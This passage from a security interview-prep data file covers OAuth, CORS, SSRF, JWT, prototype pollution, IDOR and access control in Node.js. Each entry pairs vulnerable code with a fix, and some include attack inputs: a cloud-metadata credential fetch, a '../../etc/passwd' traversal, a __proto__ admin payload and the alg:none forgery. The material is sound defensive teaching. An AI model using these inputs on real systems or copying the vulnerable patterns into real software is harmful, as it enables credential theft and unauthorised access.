    shortAnswer: 'OAuth 2.0 is an authorization framework that lets users grant third-party apps access to their resources without sharing passwords. Common flows: Authorization Code (web apps), Implicit (deprecated), Client Credentials (machine-to-machine).',
    detailedExplanation: 'OAuth 2.0 solves "login with Google/GitHub" and API authorization. The Authorization Code flow: user clicks "Login with Google", gets redirected to Google with client_id and scope, authorizes, Google redirects back with an authorization code, your server exchanges the code for access_token and refresh_token, use access_token to access user\'s Google resources. PKCE (Proof Key for Code Exchange) is required for public clients to prevent interception attacks.',
    example: {
      code: `// OAuth 2.0 Authorization Code Flow with PKCE

// Step 1: Generate PKCE challenge
const crypto = require('crypto');

function generateCodeVerifier() {
  return crypto.randomBytes(32).toString('base64url');
}

function generateCodeChallenge(verifier) {
  return crypto.createHash('sha256')
    .update(verifier)
    .digest('base64url');
}

const codeVerifier = generateCodeVerifier();
const codeChallenge = generateCodeChallenge(codeVerifier);

// Store verifier in session for later
req.session.codeVerifier = codeVerifier;

// Step 2: Redirect to authorization server
const authUrl = new URL('https://accounts.google.com/o/oauth2/v2/auth');
authUrl.searchParams.set('client_id', process.env.GOOGLE_CLIENT_ID);
authUrl.searchParams.set('redirect_uri', 'https://myapp.com/auth/callback');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('scope', 'openid email profile');
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
authUrl.searchParams.set('state', randomState); // CSRF protection

res.redirect(authUrl.toString());

// Step 3: Handle callback - exchange code for tokens
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // Verify state (CSRF protection)
  if (state !== req.session.oauthState) {
    return res.status(400).json({ error: 'State mismatch' });
  }
  
  // Exchange code for tokens
  const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      code,
      client_id: process.env.GOOGLE_CLIENT_ID,
      client_secret: process.env.GOOGLE_CLIENT_SECRET,
      redirect_uri: 'https://myapp.com/auth/callback',
      grant_type: 'authorization_code',
      code_verifier: req.session.codeVerifier
    })
  });
  
  const { access_token, refresh_token, id_token } = await tokenResponse.json();
  
  // Step 4: Get user info
  const userInfo = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', {
    headers: { Authorization: \`Bearer \${access_token}\` }
  }).then(r => r.json());
  
  // Create/update user in your database
  const user = await User.findOrCreate({ googleId: userInfo.sub, email: userInfo.email });
  
  // Create your own session
  req.session.userId = user.id;
  res.redirect('/dashboard');
});`,
      language: 'javascript'
    },
    interviewAnswer: 'OAuth 2.0 is the standard for "Login with Google/GitHub". The key insight is that your application never sees the user\'s Google password â€” Google authenticates them and returns a token you can use to access their profile. Always use PKCE in public clients (SPAs, mobile) to prevent authorization code interception. The state parameter prevents CSRF attacks on the OAuth flow itself.',
    commonMistakes: [
      'Skipping PKCE for public clients (authorization code interception)',
      'Not validating the state parameter (CSRF vulnerability)',
      'Storing access tokens in localStorage (use httpOnly cookies)',
      'Confusing OAuth (authorization) with OpenID Connect (authentication)'
    ],
    realWorldUse: 'GitHub, Google, Facebook login buttons on every app. API authorization for third-party integrations. Passport.js implements OAuth strategies. Auth0 abstracts the entire flow.',
    followUpQuestions: [
      'What is the difference between OAuth and OpenID Connect?',
      'What is PKCE and why is it needed?',
      'What is a refresh token and when does it expire?'
    ]
  },

  {
    id: 'sec-dependency-vulnerabilities',
    category: 'security',
    type: 'theory',
    question: 'How do you handle dependency vulnerabilities in Node.js?',
    difficulty: 'intermediate',
    tags: ['dependencies', 'npm-audit', 'supply-chain'],
    shortAnswer: 'Run npm audit regularly to scan for known vulnerabilities. Use npm audit fix for automatic fixes. Keep dependencies updated. Use lockfiles. Consider tools like Snyk or Dependabot for automated monitoring.',
    detailedExplanation: 'Supply chain attacks via npm packages are increasing. npm audit checks your dependency tree against a vulnerability database. Critical vulnerabilities need immediate fixes. High/Medium can be scheduled. Use exact version pinning in package.json to prevent surprise updates. package-lock.json ensures reproducible builds. Tools like Snyk, Dependabot, and GitHub Security Advisories automate monitoring and PRs for vulnerable packages.',
    example: {
      code: `# Run npm audit
npm audit

# Output:
# found 3 vulnerabilities (1 moderate, 2 high)
# Run \`npm audit fix\` to fix them, or \`npm audit fix --force\` for breaking changes

# Fix automatically
npm audit fix

# Review what would change (dry run)
npm audit fix --dry-run

# View detailed report
npm audit --json > audit-report.json

# Update specific package
npm update express
npm install lodash@4.17.21  # Install specific patched version

# Check outdated packages
npm outdated

// package.json - exact versions (more secure than ranges)
{
  "dependencies": {
    "express": "4.18.2",     // Exact - recommended for security
    "lodash": "~4.17.21",    // Patch updates only
    "react": "^18.2.0"       // Minor updates (less secure)
  }
}

// .npmrc - additional security
// audit=true
// save-exact=true  // Always pin exact versions

// GitHub Actions - automated security scanning
// .github/workflows/security.yml
// - uses: actions/checkout@v3
// - run: npm audit --audit-level=high
//   (fails CI if high severity vulnerabilities found)

// Snyk integration
// snyk test          # Scan for vulnerabilities
// snyk monitor       # Monitor continuously
// snyk fix           # Apply fixes

// What to do when a critical CVE is found:
// 1. Check if you actually use the vulnerable code path
// 2. Update if a fix is available
// 3. If no fix: assess risk, consider alternatives
// 4. Never ignore Critical/High in production`,
      language: 'bash'
    },
    interviewAnswer: 'I run npm audit in CI pipelines so builds fail if high or critical vulnerabilities are found. I use Dependabot which automatically creates PRs when vulnerabilities are discovered. For production apps, I pin exact versions in package.json to prevent surprise updates. The log4shell vulnerability was a reminder that transitive dependencies (dependencies of your dependencies) are just as dangerous.',
    commonMistakes: [
      'Never running npm audit',
      'Ignoring audit results without reviewing',
      'Using npm audit fix --force without reviewing breaking changes',
      'Not including audit checks in CI/CD pipeline'
    ],
    realWorldUse: 'Every professional Node.js project. GitHub has built-in Dependabot alerts. Many enterprises require security scanning as part of deployment pipeline.',
    followUpQuestions: [
      'What is a transitive dependency?',
      'What is a supply chain attack?',
      'How does Dependabot work?'
    ]
  },
  {
    id: 'sec-cors-deep',
    category: 'security',
    type: 'theory',
    question: 'How does CORS work in depth — what is a preflight request and when does it trigger?',
    difficulty: 'intermediate',
    tags: ['security', 'cors', 'http', 'browser'],
    shortAnswer: 'CORS blocks cross-origin requests unless the server explicitly allows them with Access-Control-Allow-Origin. A preflight OPTIONS request is sent before "non-simple" requests (non-GET/POST, custom headers, non-standard content types) to check permission.',
    detailedExplanation: 'Simple requests (GET/POST with standard headers and text/plain or form content-type) go directly. Non-simple requests (PUT, DELETE, Authorization header, application/json body) trigger an OPTIONS preflight. The browser waits for the preflight to succeed before sending the real request. Wildcard (*) in ACAO cannot be used with credentials.',
    example: {
      code: `// Express CORS configuration
const cors = require('cors');

app.use(cors({
  origin: ['https://app.example.com', 'https://admin.example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,           // allow cookies
  maxAge: 86400,               // cache preflight for 24h
}));

// Manual preflight handling
app.options('*', cors()); // handle preflight for all routes

// What a preflight looks like:
// OPTIONS /api/users
// Origin: https://app.example.com
// Access-Control-Request-Method: PUT
// Access-Control-Request-Headers: Authorization

// Server response:
// Access-Control-Allow-Origin: https://app.example.com
// Access-Control-Allow-Methods: GET, POST, PUT, DELETE
// Access-Control-Allow-Headers: Authorization
// Access-Control-Max-Age: 86400`,
      language: 'javascript'
    },
    interviewAnswer: 'Walk through simple vs non-simple requests. The Authorization header is the most common trigger of preflight. maxAge reduces repeated preflight overhead.',
    commonMistakes: ['Using Access-Control-Allow-Origin: * with credentials: true — browsers reject this', 'Not handling OPTIONS preflight routes explicitly'],
    realWorldUse: 'Every SPA + API setup, especially when frontend and backend are on different origins.',
    followUpQuestions: ['Why can\'t you use wildcard ACAO with credentials?', 'What is the difference between CORS and CSRF?']
  },

  {
    id: 'sec-helmet',
    category: 'security',
    type: 'theory',
    question: 'What security HTTP headers should every Node.js/Express app set, and what does Helmet.js do?',
    difficulty: 'intermediate',
    tags: ['security', 'http-headers', 'helmet', 'express'],
    shortAnswer: 'Helmet.js sets 14+ security headers including: CSP (blocks XSS by whitelisting sources), HSTS (force HTTPS), X-Frame-Options (prevent clickjacking), X-Content-Type-Options (prevent MIME sniffing), and Referrer-Policy.',
    detailedExplanation: 'Content-Security-Policy is the most powerful: it whitelists origins for scripts, styles, images, and frames, blocking most XSS payloads. HSTS tells browsers to always use HTTPS. X-Frame-Options: DENY prevents embedding your site in iframes (clickjacking). X-Content-Type-Options: nosniff prevents browsers from executing mis-typed content.',
    example: {
      code: `const helmet = require('helmet');

// Apply all defaults (recommended starting point)
app.use(helmet());

// Customise CSP
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      styleSrc: ["'self'", "'unsafe-inline'"], // avoid unsafe-inline when possible
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      frameAncestors: ["'none'"], // replaces X-Frame-Options
    },
  },
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
}));`,
      language: 'javascript'
    },
    interviewAnswer: 'Lead with "Helmet sets security headers in one line." Then detail CSP as the most impactful one for XSS mitigation. Mention the clickjacking and MIME-sniffing headers.',
    commonMistakes: ['Setting Content-Security-Policy: default-src \'unsafe-inline\' \'unsafe-eval\' — negates CSP', 'Not setting HSTS includeSubDomains when subdomains are also HTTPS'],
    realWorldUse: 'Every production Express app. First middleware to add after the server setup.',
    followUpQuestions: ['What is a CSP violation report and how do you use report-uri?', 'What is clickjacking?']
  },

  {
    id: 'sec-ssrf',
    category: 'security',
    type: 'theory',
    question: 'What is Server-Side Request Forgery (SSRF) and how do you prevent it?',
    difficulty: 'advanced',
    tags: ['security', 'ssrf', 'vulnerabilities'],
    shortAnswer: 'SSRF tricks your server into making HTTP requests to unintended destinations — internal services, cloud metadata endpoints (169.254.169.254), or the localhost. Prevention: validate and allowlist URLs, block private IP ranges, use a dedicated egress proxy.',
    detailedExplanation: 'SSRF occurs when user-supplied URLs are fetched server-side without validation. An attacker can: read AWS/GCP metadata credentials (169.254.169.254), access internal databases, scan the internal network. Prevention: parse and validate the URL, block private/loopback IP ranges, resolve DNS and check again (DNS rebinding), or use a dedicated egress proxy that enforces allowlists.',
    example: {
      code: `// ❌ Vulnerable: user controls the URL
app.post('/fetch', async (req, res) => {
  const data = await fetch(req.body.url); // SSRF!
  // Attacker sends: http://169.254.169.254/latest/meta-data/
  // → Gets AWS credentials!
});

// ✅ Prevention: URL allowlist validation
const ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com'];

function validateUrl(urlString) {
  const url = new URL(urlString);
  if (!['http:', 'https:'].includes(url.protocol)) throw new Error('Invalid protocol');
  if (!ALLOWED_DOMAINS.includes(url.hostname)) throw new Error('Domain not allowed');
  // Also block private IPs: 10.x, 172.16.x, 192.168.x, 127.x, 169.254.x
  return url;
}

// ✅ Or block private IP ranges after DNS resolution
const dns = require('dns').promises;
async function isSafeHost(hostname) {
  const { address } = await dns.lookup(hostname);
  return !isPrivateIp(address); // use 'is-private-ip' package
}`,
      language: 'javascript'
    },
    interviewAnswer: 'Start with the AWS metadata endpoint example — it\'s the most impactful real-world SSRF attack. Then describe allowlisting as the correct fix.',
    commonMistakes: ['Blocking only by hostname without resolving DNS (DNS rebinding bypass)', 'Not blocking non-HTTP protocols (file://, gopher://)'],
    realWorldUse: 'Any feature that fetches a user-provided URL: webhook testers, URL preview, image import.',
    followUpQuestions: ['What is DNS rebinding?', 'How did SSRF contribute to the Capital One breach?']
  },

  {
    id: 'sec-secure-headers',
    category: 'security',
    type: 'theory',
    question: 'What is clickjacking and how do you prevent it?',
    difficulty: 'beginner',
    tags: ['security', 'clickjacking', 'iframe', 'csp'],
    shortAnswer: 'Clickjacking embeds your site in a transparent iframe over a decoy site, tricking users into clicking your buttons. Prevent with X-Frame-Options: DENY/SAMEORIGIN or Content-Security-Policy: frame-ancestors \'none\'.',
    detailedExplanation: 'The attacker overlays your login button (transparent iframe) over their "Click here to win!" button. The victim thinks they\'re clicking on the attacker\'s page but actually clicking your application. X-Frame-Options is the older standard; CSP frame-ancestors is the modern replacement that also supports allowlisting specific origins.',
    example: {
      code: `// Option 1: X-Frame-Options header (older, still widely supported)
res.setHeader('X-Frame-Options', 'DENY'); // never embed
// or
res.setHeader('X-Frame-Options', 'SAMEORIGIN'); // only same origin

// Option 2: CSP frame-ancestors (modern, more flexible)
res.setHeader(
  'Content-Security-Policy',
  "frame-ancestors 'none'"  // never embed in iframe
);

// Allow embedding by a specific trusted partner:
"frame-ancestors 'self' https://partner.example.com"

// With Helmet:
app.use(helmet({
  frameguard: { action: 'deny' },
  // or via contentSecurityPolicy frameAncestors
}));`,
      language: 'javascript'
    },
    interviewAnswer: 'Describe the transparent iframe attack, then give both the header name and the CSP directive. Note that frame-ancestors supersedes X-Frame-Options.',
    commonMistakes: ['Setting SAMEORIGIN when your app is never legitimately embedded', 'Relying only on X-Frame-Options — CSP frame-ancestors is the recommended modern standard'],
    realWorldUse: 'Banking sites, payment pages, admin dashboards — any sensitive action page.',
    followUpQuestions: ['What is the difference between X-Frame-Options and CSP frame-ancestors?', 'Can JavaScript detect clickjacking?']
  },

  {
    id: 'sec-timing-attacks',
    category: 'security',
    type: 'theory',
    question: 'What is a timing attack and how do you prevent it in authentication code?',
    difficulty: 'advanced',
    tags: ['security', 'timing-attack', 'authentication', 'crypto'],
    shortAnswer: 'A timing attack measures how long a comparison takes to infer its result. String equality (===) returns early on first mismatch — an attacker can guess a token one character at a time by measuring response time. Use crypto.timingSafeEqual() for constant-time comparison.',
    detailedExplanation: 'Regular string comparison short-circuits — "abc" !== "abd" returns false faster than "abc" !== "xyz" because it stops at the third character. By measuring thousands of requests, an attacker can identify when a character is correct (slower comparison). cryptographic operations use constant-time comparison to prevent this.',
    example: {
      code: `const crypto = require('crypto');

// ❌ Vulnerable to timing attack
function verifyToken(provided, stored) {
  return provided === stored; // short-circuits!
}

// ✅ Constant-time comparison
function verifyToken(provided, stored) {
  if (provided.length !== stored.length) {
    // Still vulnerable if lengths differ — attacker learns length
    // Use fixed-length hashes for comparison instead
  }
  return crypto.timingSafeEqual(
    Buffer.from(provided),
    Buffer.from(stored)
  );
}

// ✅ Better: compare HMACs (always fixed length)
function verifyWebhookSignature(payload, signature, secret) {
  const expected = crypto
    .createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  );
}`,
      language: 'javascript'
    },
    interviewAnswer: 'The short-circuit early-return is the key explanation. Then show timingSafeEqual and the HMAC pattern for webhook verification.',
    commonMistakes: ['Using === for comparing API keys, tokens, or HMAC signatures', 'Not using timingSafeEqual when buffers are different lengths (still leaks information)'],
    realWorldUse: 'API key validation, webhook signature verification, password reset tokens.',
    followUpQuestions: ['How does bcrypt protect against timing attacks on password comparison?', 'What is an HMAC?']
  },

  {
    id: 'sec-secrets-management',
    category: 'security',
    type: 'theory',
    question: 'How should you manage secrets (API keys, DB passwords) in a Node.js application?',
    difficulty: 'intermediate',
    tags: ['security', 'secrets', 'env-variables', 'devops'],
    shortAnswer: 'Never hardcode secrets or commit .env files. In development use dotenv. In production use a secrets manager (AWS Secrets Manager, HashiCorp Vault, or the platform\'s secret store like Kubernetes Secrets or Railway/Heroku env vars). Rotate secrets regularly.',
    detailedExplanation: 'The secret lifecycle: store in secrets manager → inject into environment at deploy time → read via process.env → never log. Audit practices: git secret scanning (GitGuardian, GitHub secret scanning), restrict secret access by role, audit access logs. Rotation: use secrets with versioning so old key works during rotation window.',
    example: {
      code: `// ✅ Correct usage — read from environment
const config = {
  dbUrl: process.env.DATABASE_URL,      // not hardcoded
  jwtSecret: process.env.JWT_SECRET,
  stripeKey: process.env.STRIPE_SECRET_KEY,
};

// ❌ Never hardcode
const config = { jwtSecret: 'my_super_secret_key_123' }; // WRONG

// Validate at startup — fail fast if secrets missing
const required = ['DATABASE_URL', 'JWT_SECRET', 'STRIPE_SECRET_KEY'];
required.forEach(key => {
  if (!process.env[key]) throw new Error(\`Missing env var: \${key}\`);
});

// AWS Secrets Manager integration
const { SecretsManager } = require('@aws-sdk/client-secrets-manager');
const secret = await client.send(new GetSecretValueCommand({ SecretId: 'prod/app/db' }));

// .gitignore .env always
// .env.example (without values) is OK to commit`,
      language: 'javascript'
    },
    interviewAnswer: 'Cover the three environments (dev: dotenv, staging/prod: platform secrets or Vault), the no-log rule, and startup validation.',
    commonMistakes: ['Committing .env files — add to .gitignore and add a pre-commit hook', 'Logging request headers or body that may contain secrets', 'Using the same secrets across environments'],
    realWorldUse: 'Every production application. Secret leaks in GitHub are one of the most common security incidents.',
    followUpQuestions: ['What is HashiCorp Vault?', 'How do you scan a git history for accidentally committed secrets?']
  },

  {
    id: 'sec-jwt-security',
    category: 'security',
    type: 'theory',
    question: 'What are the common JWT security vulnerabilities and how do you mitigate them?',
    difficulty: 'advanced',
    tags: ['security', 'jwt', 'auth', 'vulnerabilities'],
    shortAnswer: 'Common JWT vulnerabilities: (1) "alg:none" attack — always specify the algorithm explicitly; (2) weak secret — use 256+ bit random secrets; (3) no expiry — always set exp; (4) stored in localStorage — XSS can steal it; (5) no revocation — use short expiry + refresh tokens.',
    detailedExplanation: 'The "alg:none" attack: a malicious JWT sets the algorithm to "none" and removes the signature. Vulnerable libraries accept it. Fix: explicitly tell jwt.verify() which algorithm to expect. Weak secrets are brute-forceable — use crypto.randomBytes(32).toString(\'hex\'). JWTs are stateless and cannot be revoked before expiry without a denylist.',
    example: {
      code: `const jwt = require('jsonwebtoken');

// ❌ Vulnerable: doesn't specify algorithm
const payload = jwt.verify(token, secret); // accepts "alg:none"!

// ✅ Always specify the algorithm
const payload = jwt.verify(token, secret, { algorithms: ['HS256'] });

// ✅ Generate strong secrets
const secret = crypto.randomBytes(32).toString('hex'); // 256-bit

// ✅ Always set expiry
const token = jwt.sign({ userId: 1 }, secret, {
  expiresIn: '15m',    // short-lived access token
  algorithm: 'HS256',
});

// ✅ Store in httpOnly cookie (not localStorage)
res.cookie('token', accessToken, {
  httpOnly: true,  // JS cannot read it → prevents XSS theft
  secure: true,    // HTTPS only
  sameSite: 'strict', // CSRF protection
});`,
      language: 'javascript'
    },
    interviewAnswer: 'The alg:none attack is the most important to mention — it\'s a real CVE in major libraries. Then cover storage (httpOnly cookie) and expiry.',
    commonMistakes: ['Storing JWT in localStorage — XSS-vulnerable', 'Not validating the algorithm field', 'Using a short string like "secret" as the JWT secret'],
    realWorldUse: 'Authentication in every REST API, OAuth 2.0 tokens, identity federation.',
    followUpQuestions: ['What is the difference between HS256 and RS256?', 'How do you revoke a JWT before it expires?']
  },

  {
    id: 'sec-prototype-pollution',
    category: 'security',
    type: 'theory',
    question: 'What is prototype pollution in JavaScript and how does it lead to security vulnerabilities?',
    difficulty: 'advanced',
    tags: ['security', 'javascript', 'prototype-pollution', 'vulnerabilities'],
    shortAnswer: 'Prototype pollution modifies Object.prototype, affecting all objects in the process. Attackers inject payloads like {"__proto__":{"admin":true}} into deserialized objects. This can bypass auth checks, cause DoS, or enable RCE in some frameworks.',
    detailedExplanation: 'If your code does obj[key] = value with user-supplied keys and values, and the key is "__proto__", it modifies the prototype of all objects. Vulnerable pattern: deep merge of user-supplied JSON without sanitisation. Lodash, jQuery had this CVE. Mitigation: use Object.create(null) for data-only maps, validate keys, use structuredClone for deep copies.',
    example: {
      code: `// Vulnerable deep merge
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key]; // ❌ can set __proto__
    }
  }
}

const payload = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge({}, payload);
console.log({}.isAdmin); // true — ALL objects now have isAdmin!

// Auth bypass:
if (user.isAdmin) allowAccess(); // ← now always true!

// ✅ Mitigation 1: check for dangerous keys
function safeMerge(target, source) {
  for (const key of Object.keys(source)) { // Object.keys, not for...in
    if (key === '__proto__' || key === 'constructor') continue;
    // ...
  }
}

// ✅ Mitigation 2: Object.create(null) — no prototype
const safeMap = Object.create(null);
safeMap['__proto__'] = 'value'; // just sets a property, not the prototype`,
      language: 'javascript'
    },
    interviewAnswer: 'Demonstrate the auth bypass impact. Mention Object.keys() vs for...in (Object.keys doesn\'t include inherited props) and Object.create(null) as the main mitigations.',
    commonMistakes: ['Using for...in for property iteration on user data (inherits prototype)', 'Not sanitising JSON before deep merging into objects'],
    realWorldUse: 'API endpoints that accept arbitrary JSON, deep merge utilities, query string parsers.',
    followUpQuestions: ['How does Object.freeze(Object.prototype) help?', 'What Node.js version added built-in protection against prototype pollution?']
  },

  {
    id: 'sec-idor-bola',
    category: 'security',
    type: 'theory',
    question: 'What is IDOR (Insecure Direct Object Reference) / BOLA and how do you prevent it?',
    difficulty: 'intermediate',
    tags: ['idor', 'bola', 'authorization', 'owasp'],
    shortAnswer: 'IDOR/BOLA (Broken Object Level Authorization) allows users to access other users\' resources by manipulating IDs in requests. The #1 OWASP API vulnerability. Prevent by always verifying the authenticated user owns or has permission to access the requested resource.',
    detailedExplanation: 'IDOR occurs when an API uses user-supplied identifiers (path params, query strings, body) to access objects without verifying the requester owns them. Example: GET /api/invoices/1234 works fine for the owner, but any authenticated user can change 1234 to access another user\'s invoice. The fix: always query with both the object ID AND the current user\'s ID so the database enforces ownership.',
    example: {
      code: `// ❌ Vulnerable — any authenticated user can access any order
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await prisma.order.findUnique({
    where: { id: req.params.orderId }  // Only filtering by ID!
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  res.json(order);
});
// Attacker: GET /api/orders/1 → sees User A's order
// Attacker: GET /api/orders/2 → sees User B's order

// ✅ Secure — enforce ownership in the query
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await prisma.order.findFirst({
    where: {
      id: req.params.orderId,
      userId: req.user.id,  // Must belong to current user!
    }
  });
  if (!order) return res.status(404).json({ error: 'Not found' });
  // Returns 404 whether the order doesn't exist OR belongs to someone else
  // Don't reveal 403 (would confirm the resource exists)
  res.json(order);
});

// ✅ For admin operations — check role too
app.delete('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await prisma.order.findUnique({
    where: { id: req.params.orderId }
  });
  if (!order) return res.status(404).json({ error: 'Not found' });

  // Check ownership OR admin role
  if (order.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }

  await prisma.order.delete({ where: { id: req.params.orderId } });
  res.status(204).send();
});

// ✅ PostgreSQL Row Level Security (architectural solution)
// Set up once, applies automatically to all queries
CREATE POLICY user_orders ON orders
  USING (user_id = current_setting('app.current_user_id')::UUID);

// ✅ Use UUIDs instead of sequential IDs to make enumeration harder
// But this is defense-in-depth, not a fix — authorization must still be checked`,
      language: 'typescript',
    },
    interviewAnswer: 'IDOR is the #1 API vulnerability because it\'s so easy to miss. The fix is simple but must be consistent: always include the user\'s ID in the WHERE clause. I return 404 (not 403) when a user tries to access someone else\'s resource — returning 403 would confirm the resource exists, which is an information leak. For teams that tend to forget this, Row Level Security in PostgreSQL enforces it at the database level as a safety net.',
    commonMistakes: [
      'Returning 403 instead of 404 for other users\' resources (information leak)',
      'Checking ownership only on some routes (inconsistent)',
      'Thinking UUIDs prevent IDOR (they just make guessing harder)',
    ],
    realWorldUse: 'Every API. IDOR vulnerabilities have caused major breaches at Facebook, Instagram, Uber. Bug bounty programs pay thousands for IDOR findings.',
    followUpQuestions: ['What is the difference between IDOR and privilege escalation?', 'How does Row Level Security prevent IDOR?'],
  },

  {
    id: 'sec-security-misconfiguration',
    category: 'security',
    type: 'theory',
    question: 'What is security misconfiguration and what are the most common examples?',
    difficulty: 'intermediate',
    tags: ['security-misconfiguration', 'owasp', 'configuration', 'hardening'],
    shortAnswer: 'Security misconfiguration is OWASP #2 — leaving default settings, exposing debug info, unnecessary services enabled, missing security headers, or overly permissive access controls. The attacker doesn\'t exploit code — they exploit the configuration.',
    detailedExplanation: 'Common misconfigurations: default credentials (admin/admin), debug mode in production (stack traces), directory listing enabled, verbose error messages, missing security headers, CORS allowing all origins, outdated software, unnecessary HTTP methods enabled, cloud storage buckets publicly accessible. Prevention: security hardening checklists, IaC (Infrastructure as Code) for consistent environments, automated scanning.',
    example: {
      code: `// Common misconfigurations and fixes

// 1. Debug/stack traces in production
// ❌ Reveals internal code structure
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.stack }); // Stack trace exposed!
});

// ✅ Generic error in production
app.use((err, req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// 2. Verbose server headers reveal tech stack
// ❌ X-Powered-By: Express (tells attackers your stack)
// ✅ Remove with helmet
app.use(helmet()); // Removes X-Powered-By and adds security headers

// 3. CORS too permissive
// ❌ Allows any origin
app.use(cors()); // origin: * in production

// ✅ Whitelist specific origins
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
}));

// 4. Default MongoDB/Redis with no auth
// ❌ Services bound to 0.0.0.0 with no password
// ✅ Bind to 127.0.0.1, require auth
// mongodb://user:password@localhost:27017/mydb?authSource=admin

// 5. Environment-specific config not applied
// ❌ Same permissive dev config in production
// ✅ Strict validation of NODE_ENV
if (process.env.NODE_ENV === 'production') {
  if (!process.env.JWT_SECRET || process.env.JWT_SECRET.length < 32) {
    throw new Error('JWT_SECRET must be at least 32 chars in production');
  }
  if (process.env.DATABASE_URL?.includes('localhost')) {
    throw new Error('Production cannot use localhost database');
  }
}

// 6. Directory listing exposed
// Ensure express.static doesn't expose sensitive files
app.use('/public', express.static('public', {
  index: false,       // No auto-serving index.html
  dotfiles: 'deny',   // Block .env, .git etc.
}));

// 7. Unnecessary HTTP methods
app.use((req, res, next) => {
  const allowed = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'];
  if (!allowed.includes(req.method)) {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  next();
});`,
      language: 'typescript',
    },
    interviewAnswer: 'Security misconfiguration is so common because developers focus on features, not hardening. I use a security checklist before every deployment: helmet enabled, no stack traces in production, CORS whitelist, no default credentials, no debug endpoints accessible. Automated tools like OWASP ZAP or Snyk catch many of these. The most dangerous misconfiguration I\'ve seen in production is a public S3 bucket — someone set it to public for testing and forgot.',
    commonMistakes: [
      'Using dev-friendly settings in production (debug mode, verbose errors)',
      'Leaving default credentials on databases/admin panels',
      'Publicly accessible cloud storage buckets',
    ],
    realWorldUse: 'The 2019 Capital One breach was largely due to a misconfigured web application firewall. Many major breaches trace back to misconfiguration rather than code vulnerabilities.',
    followUpQuestions: ['What tools scan for security misconfigurations?', 'What is the principle of least privilege?'],
  },

  {
    id: 'sec-broken-access-control',
    category: 'security',
    type: 'theory',
    question: 'What is broken access control and what are the main types?',
    difficulty: 'intermediate',
    tags: ['access-control', 'authorization', 'privilege-escalation', 'owasp'],
    shortAnswer: 'Broken Access Control (#1 OWASP 2021) — failures in enforcing what authenticated users are allowed to do. Types: IDOR (access other users\' data), privilege escalation (gain higher permissions), path traversal (access files outside web root), forced browsing (access unlinked admin pages).',
    detailedExplanation: 'Access control enforces that users can only perform actions and access data they\'re permitted to. Common failures: missing function-level authorization checks, JWT containing role that can be modified client-side, CORS misconfiguration allowing unauthorized origins, path traversal via ../../../etc/passwd, insecure direct object reference, privilege escalation by modifying a role field.',
    example: {
      code: `// Types of broken access control

// 1. Vertical privilege escalation — accessing admin functions
// ❌ Only checks authentication, not authorization
app.get('/api/admin/users', authenticate, getAllUsers);

// ✅ Check role
app.get('/api/admin/users', authenticate, authorize('admin'), getAllUsers);

// 2. Horizontal privilege escalation — accessing other users' data (IDOR)
// ❌ No ownership check
app.put('/api/profile', authenticate, async (req, res) => {
  await User.findByIdAndUpdate(req.body.userId, req.body.data);
});

// ✅ Force update own profile only
app.put('/api/profile', authenticate, async (req, res) => {
  await User.findByIdAndUpdate(req.user.id, req.body.data); // Use token ID
});

// 3. Path traversal — access files outside webroot
// ❌ User controls file path
app.get('/files/:filename', (req, res) => {
  res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
  // filename = '../../etc/passwd' → reads /etc/passwd!
});

// ✅ Sanitize path
const path = require('path');
app.get('/files/:filename', (req, res) => {
  const safePath = path.join(__dirname, 'uploads', req.params.filename);
  const uploadsDir = path.join(__dirname, 'uploads');

  // Ensure resolved path is still within uploads directory
  if (!safePath.startsWith(uploadsDir)) {
    return res.status(400).json({ error: 'Invalid file path' });
  }
  res.sendFile(safePath);
});

// 4. JWT role manipulation
// ❌ Role stored in JWT — user can modify it
const token = jwt.sign({ userId: '123', role: 'admin' }, secret);
// Decode, modify role to 'admin', re-sign with weak secret

// ✅ Role fetched from database on each request, not from token
const decoded = jwt.verify(token, secret);
const user = await User.findById(decoded.userId); // Get role from DB
req.user = user; // Use DB role, not token role

// 5. Force browsing — unprotected admin routes
// ❌ Admin routes not secured because "they're not linked anywhere"
app.get('/admin/delete-all-users', deleteAllUsers); // No auth!

// ✅ Always protect sensitive routes regardless of whether they're "hidden"
app.get('/admin/delete-all-users', authenticate, authorize('superadmin'), deleteAllUsers);`,
      language: 'typescript',
    },
    interviewAnswer: 'Broken access control covers a wide range of issues, all boiling down to "user can do things they shouldn\'t." I treat every route as potentially accessible by any authenticated user and explicitly check what they\'re allowed to do. The most dangerous pattern I watch for in code reviews is storing the user\'s role in a JWT — if the signing key is weak or exposed, an attacker can escalate their privileges. Always fetch the current role from the database.',
    commonMistakes: [
